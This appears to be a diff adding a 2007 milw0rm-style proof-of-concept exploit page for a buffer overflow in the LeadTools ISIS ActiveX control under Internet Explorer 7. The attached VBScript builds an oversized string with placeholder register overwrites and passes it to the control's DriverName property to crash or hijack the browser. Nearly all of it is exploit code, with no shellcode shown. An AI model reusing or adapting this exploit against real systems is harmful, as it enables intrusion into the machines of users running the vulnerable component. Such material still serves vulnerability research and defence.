@@ -1,0 +1,38 @@
+<pre>
+<span style="font: 14pt Courier New;"><p align="center"><b>2007/05/22</b></p></span>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------------
+ <b>LeadTools ISIS Control (ltisi14E.ocx v. 14.5.0.44) Remote Buffer Overflow Exploit</b>
+ url: http://www.leadtools.com/
+ price: eheheh, take a look at thier site :)
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ 
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+ all software that use this ocx are vulnerable to this exploits.
+-----------------------------------------------------------------------------------
+
+<object classid='clsid:00140050-B1BA-11CE-ABC6-F5B2E79D9E3F' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<script language='vbscript'>
+ Sub tryMe
+  buff = String(752, "A")
+
+  get_EAX = "aaaa"
+
+  get_EDI = "bbbb"
+
+  buff1 = String(7240, "B")
+
+  egg = buff + get_EDI + get_EAX + buff1
+
+  test.DriverName = egg
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-05-22]
